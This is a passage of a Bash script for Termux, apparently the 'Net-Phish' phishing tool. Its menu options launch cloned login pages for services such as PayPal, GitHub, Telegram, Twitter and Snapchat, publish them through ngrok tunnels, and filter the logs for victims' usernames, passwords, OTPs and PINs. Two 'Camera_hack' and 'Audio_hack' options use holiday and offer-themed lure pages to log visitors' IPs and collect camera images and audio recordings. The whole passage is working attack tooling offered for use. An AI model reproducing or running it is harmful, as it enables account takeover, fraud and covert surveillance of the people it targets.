                    elif [ $option = 14 ]
	            then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd spotify/
                           echo 
			   connection
                           ( sleep 5 ) &> /dev/null & spin_whale
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo 
                           (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
			   tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                        
			   ( sleep 6 ) &> /dev/null & spinner1
		           ash 
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo 
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo 
			   echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
                           echo 
                           tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"        

                           break;
			   
	            elif [ $option = 15 ]
	            then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd github/
                           echo 
			   connection
                           ( sleep 5 ) &> /dev/null & spin_whale
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo 
                           (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
			   echo
			   tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                         
			   ( sleep 6 ) &> /dev/null & spinner1
	                   ash
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo 
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo 
			   echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
			   echo
                           tail -f log.txt | grep -e "login" -e "password" -e "otp"       

                           break;
			   
	        elif [ $option = 16 ]
	        then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd ipfinder/
                           echo 
			   connection
                           ( sleep 5 ) &> /dev/null & spin_whale
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo 
                           (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
			   tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
			   ( sleep 6 ) &> /dev/null & spinner1
             		   ash
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo 
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo 
			   echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m======================== \e[92m"
                           echo 
                           tail -f ip.txt        

                           break;

                  elif [ $option = 17 ]
	          then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd Zomato-Phishing/
                           echo 
			   connection
                           ( sleep 5 ) &> /dev/null & spin_whale
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo 
                           (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
			   tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
			   ( sleep 6 ) &> /dev/null & spinner1
	                   ash
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo 
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo 
			   echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
                           echo 
                           tail -f log.txt | grep -e "email" -e "otp" -e "OTP"                

                           break;

                   elif [ $option = 18 ]
	           then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd phonepay/
                           echo 
			   connection
                           ( sleep 5 ) &> /dev/null & spin_whale
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo 
                           (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
			   tput cnorm
			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                
			   ( sleep 6 ) &> /dev/null & spinner1
          		   ash
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo 
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo 
			   echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
                           echo 
                           tail -f log.txt | grep -e "number" -e "otp"                       

                           break;
			   
	            elif [ $option = 19 ]
	            then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd paypal/
                           echo 
			   connection
                           ( sleep 5 ) &> /dev/null & spin_whale
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo 
                           (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
			   tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
			   ( sleep 6 ) &> /dev/null & spinner1
	                   ash
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo 
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo 
			   echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
                           echo 
                           tail -f log.txt | grep -e "login_email" -e "login_password" -e "otpCode"    

                           break;
           
	            elif [ $option = 20 ]
	            then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd telegram/
                           echo 
			   connection
                           ( sleep 5 ) &> /dev/null & spin_whale
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo 
                           (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
			   tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
			   ( sleep 6 ) &> /dev/null & spinner1
		           ash
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo 
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo 
			   echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
                           echo 
                           tail -f log.txt | grep -e "phone_number" -e "phone_code"     

                           break;
			   
	            elif [ $option = 21 ]
	            then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd twitter/
                           echo 
			   connection
                           ( sleep 5 ) &> /dev/null & spin_whale
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo 
                           (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
			   tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
			   ( sleep 6 ) &> /dev/null & spinner1
	 	           ash
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo 
			   echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
                           echo 
                           tail -f log.txt | grep -e "phone_or_email" -e "password" -e "challenge_response"      

                           break;
                    
		    elif [ $option = 22 ]
	            then
                          cd /data/data/com.termux/files/usr/bin/phs
                          cd flipcart/
                          echo 
			  connection
                          ( sleep 5 ) &> /dev/null & spin_whale
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 1
                          echo 
                          (sleep 6) &> /dev/null & spin
			  echo
			  tput civis
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          ( sleep 18 ) &> /dev/null & spinner
                          echo 
			  tput cnorm
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                         
			  ( sleep 6 ) &> /dev/null & spinner1
		          ash
			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			  clear
			  whale_logo
			  echo 
			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			  echo 
			  echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
			  echo
                          tail -f log.txt | grep -e "email" -e "password" -e "otp"     

                          break;
       
                  elif [ $option = 23 ]
	          then
                          cd /data/data/com.termux/files/usr/bin/phs
                          cd wordpress/
                          echo 
			  connection
                          ( sleep 5 ) &> /dev/null & spin_whale
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 1
                          echo 
                          (sleep 6) &> /dev/null & spin
			  echo
			  tput civis
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          ( sleep 18 ) &> /dev/null & spinner
                          echo 
			  tput cnorm
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
			  ( sleep 6 ) &> /dev/null & spinner1
		          ash
			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			  clear
			  whale_logo
			  echo 
			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			  echo 
			  echo -e "\e[96m========================\e[92m    Net-Phish © 2024     \e[96m========================= \e[92m"
                          echo 
                          tail -f log.txt | grep -e "log" -e "pwd"       

                          break;
			  
	           elif [ $option = 24 ]
	           then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd snapchat/
                           echo 
			   connection
                           ( sleep 5 ) &> /dev/null & spin_whale
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo 
                           (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
			   tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
			   ( sleep 6 ) &> /dev/null & spinner1
		           ash
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo 
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo 
			   echo -e "\e[96m========================\e[92m    Net-Phish © 2024   \e[96m========================= \e[92m"  
                           echo 
                           tail -f log.txt | grep -e "username" -e "password" -e "Code"       

                           break;
			   
		    elif [ $option = 25 ]
	            then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd protonmail/
                           echo 
			   connection
                           ( sleep 5 ) &> /dev/null & spin_whale
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo 
                           (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
			   tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                         
			   ( sleep 6 ) &> /dev/null & spinner1
	              	   ash
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo 
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo 
			   echo -e "\e[96m========================\e[92m    Net-Phish © 2024   \e[96m========================= \e[92m"
                           echo 
                           tail -f log.txt | grep -e "username" -e "password"   

                           break;

                  elif [ $option = 26 ]
	          then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd stackoverflow/
                           echo 
			   connection
                           ( sleep 5 ) &> /dev/null & spin_whale
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo 
                           (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
			   tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
			   ( sleep 6 ) &> /dev/null & spinner1
		           ash
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo 
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo 
			   echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
                           echo 
                           tail -f log.txt | grep -e "email" -e "password"                 

                           break;

                  elif [ $option = 27 ]
	          then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd ebay/
                           echo 
			   connection
                           ( sleep 5 ) &> /dev/null & spin_whale
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo 
                           (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
			   tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                        
			   ( sleep 6 ) &> /dev/null & spinner1
		           ash
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo 
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo 
			   echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
                           echo 
                           tail -f log.txt | grep -e "userid" -e "pass" -e "pin"                       

                           break;

                  elif [ $option = 28 ]
	          then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd twitch/
                           echo 
			   connection
                           ( sleep 5 ) &> /dev/null & spin_whale
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo 
                           (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
			   tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
			   ( sleep 6 ) &> /dev/null & spinner1
 		           ash
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo 
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo 
			   echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
                           echo 
                           tail -f log.txt | grep -e "Username" -e "password" -e "otp"  

                           break;
                
		    elif [ $option = 29 ]
	            then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd ajio/
                           echo 
			   connection
                           ( sleep 5 ) &> /dev/null & spin_whale
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo 
                           (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
			   tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                        
			   ( sleep 6 ) &> /dev/null & spinner1
		           ash
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo 
			   echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
                           echo 
                           tail -f log.txt | grep -e "username" -e "password"    

                           break;
			   
		  elif [ $option = 30 ]
	          then               
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd mobikwik/
                           echo 
			   connection
                           ( sleep 5 ) &> /dev/null & spin_whale
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo 
                           (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
			   tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
			   ( sleep 6 ) &> /dev/null & spinner1
		           ash
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo 
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo 
			   echo -e "\e[96m========================\e[92m    Net-Phish © 2024   \e[96m========================= \e[92m"
                           echo
                           tail -f log.txt | grep -e "userId" -e "otp"     

                           break;
			   
		  elif [ $option = 31 ]
	          then        
		           
		           cd /data/data/com.termux/files/usr/bin/phs
			   cd Camera_hack
			   file_check
			   echo
			   clear
			   echo
			   echo -e "\e[1;32m >>> \e[1;93mChoose Your Tempelates\e[m"
			   echo
			   echo -e "\e[1;31m[\e[0m\e[1;77m 1 \e[0m\e[1;31m]\e[0m\e[1;32m Diwali \e[0m" 
			   echo
			   echo -e "\e[1;31m[\e[0m\e[1;77m 2 \e[0m\e[1;31m]\e[0m\e[1;32m Freinship Dare\e[0m" 
			   echo
			   echo -e "\e[1;31m[\e[0m\e[1;77m 3 \e[0m\e[1;31m]\e[0m\e[1;32m Freindship Day \e[0m"
			   echo
			   echo -e "\e[1;31m[\e[0m\e[1;77m 4 \e[0m\e[1;31m]\e[0m\e[1;32m Happy New Year \e[0m" 
			   echo
			   echo -e "\e[1;31m[\e[0m\e[1;77m 5 \e[0m\e[1;31m]\e[0m\e[1;32m Jio Offer \e[0m"
			   echo
			   read -p $'\e[1;91m[\e[0m\e[1;92m >>> \e[0m\e[1;91m]\e[0m\e[1;93m Enter Your Choice : \e[0m' page
			   if [ $page = 1 ]
			   then 
			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                           sed 's+forwarding_link+'$link'+g' diwali.html > index2.html
                           sed 's+forwarding_link+'$link'+g' template.php > index.php
		           elif [ $page = 2 ]
		           then 
		           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
		           sed 's+forwarding_link+'$link'+g' freindship_dare.html > index2.html
			   sed 's+forwarding_link+'$link'+g' template.php > index.php
			   elif [ $page = 3 ]
			   then 
			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
			   sed 's+forwarding_link+'$link'+g' freinship_day.html > index2.html
			   sed 's+forwarding_link+'$link'+g' template.php > index.php
			   elif [ $page = 4 ]
			   then 
			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
			   sed 's+forwarding_link+'$link'+g' happy_new_year.html > index2.html
			   sed 's+forwarding_link+'$link'+g' template.php > index.php
			   elif [ $page = 5 ]
			   then 
			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
			   sed 's+forwarding_link+'$link'+g' jio_offer.html > index2.html
			   sed 's+forwarding_link+'$link'+g' template.php > index.php
			   fi
			   echo
			   connection
                           ( sleep 5 ) &> /dev/null & spin_whale
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo 
                           (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
			   tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
			   ( sleep 6 ) &> /dev/null & spinner1
		           ash
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo 
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo 
			   echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
                           echo
			   while [ true ]; do
                           if [[ -e "ip.txt" ]]; then
			   printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
			   echo
			   catch_ip
			   rm -rf ip.txt
			   fi
			   sleep 0.5
		           if [[ -e "Log.log" ]]; then
			   printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
			   rm -rf Log.log
			   fi
			   sleep 0.5
			   mv cam* /sdcard/Camera_hack >> /dev/null 2>&1 
			   done
			   
			   break;
			   
	           elif [ $option = 32 ]
	           then 
		            cd /data/data/com.termux/files/usr/bin/phs
			    cd Audio_hack
		            file_check1
			    echo
			    default_redirect="https://www.youtube.com/channel/MR-ForG35/about"
                            printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a distracting website (Default:\e[0m\e[1;77m https://youtube.com\e[0m\e[1;92m ): \e[0m" $default_redirect
                            read redirect_link
                            redirect_link="${redirect_link:-${default_redirect}}"
			    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
			    sed 's+forwarding_link+'$link'+g' template.php > index.php
			    sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
			    echo
			    connection
                            ( sleep 5 ) &> /dev/null & spin_whale
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
                            echo 
                            (sleep 6) &> /dev/null & spin
			    echo
			     tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
                             echo 
			    tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
			    ( sleep 6 ) &> /dev/null & spinner1
		            ash
			    read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			    clear
			    whale_logo
			    echo 
			    echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			    echo 
			    echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
                            echo
		            while [ true ]; do
                            if [[ -e "ip.txt" ]]; then
		 	    printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
			    echo
			    catch_ip
			    rm -rf ip.txt
			    fi
			    sleep 0.5
		            if [[ -e "Log.log" ]]; then
			    printf "\n\e[1;92m[\e[0m+\e[1;92m] Audio received!\e[0m\n"
			    rm -rf Log.log
			    fi
			    sleep 0.5
			    mv 20* /sdcard/Audio_hack >> /dev/null 2>&1 
			    done
			   
		            break;
			   
	          elif [ $option = 99 ]
	          then     
		      echo
		      exit 
		      break;
		      
                  else 
		  
		  echo
		  echo -e "\e[92m[\e[94m!\e[92m]\e[91m Invalid option Try Again !! \e[m "
		  sleep 2
		  fi
                  done
		  
		  
#####################################################################
#                                                                   #
#      simply changing this banner will not make you developer      #
#                   CREATED BY MR-ForG35                           #
#                   KEEP SUPPORTING                                 #
#                      THANKYOU                                     #
#                                                                   #
#####################################################################

#MR-ForG35 Team By NET-PHISIH .............MR-PaGla..........*****.......